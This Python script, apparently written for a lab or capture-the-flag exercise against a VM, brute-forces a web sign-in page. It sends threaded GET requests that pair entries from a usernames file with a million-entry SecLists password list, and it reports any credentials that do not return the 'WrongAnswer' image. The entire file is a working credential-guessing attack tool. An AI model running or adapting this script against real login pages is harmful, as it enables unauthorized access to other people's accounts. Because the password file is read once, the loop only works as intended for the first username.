import os
import threading
from pathlib import Path
from queue import Queue

import requests
from lxml import etree

VM_IP = os.environ.get("VM_IP")
if not VM_IP:
    raise SystemExit("Error: VM_IP environment variable is not set. Usage: VM_IP=<ip> python brute_force.py")
url = f"http://{VM_IP}:80"

here = Path(__file__).parent
passwords_file = open(here / "1000000-password-seclists.txt")
usernames = open(here / "usernames.txt")

queue: Queue = Queue(maxsize=10000)
found = False


def is_wrong(html: str) -> bool:
    tree = etree.HTML(html)
    image = tree.xpath('//div[@class="container"]/center/img/@src')
    return bool(image) and image[0] == "images/WrongAnswer.gif"


def try_login() -> None:
    global found
    username, password = queue.get()
    params = {
        "page": "signin",
        "Login": "Login",
        "username": username.strip(),
        "password": password.strip(),
    }
    r = requests.get(url, params=params)
    if r.status_code == 200 and not is_wrong(r.text):
        print(f"Found: {username.strip()} / {password.strip()}")
        found = True
    queue.task_done()


def bruteforce() -> None:
    for username in usernames:
        for password in passwords_file:
            if found:
                return
            queue.put((username, password))
            threading.Thread(target=try_login, daemon=True).start()
    queue.join()


if __name__ == "__main__":
    print(f"Brute-forcing {url} ...")
    bruteforce()
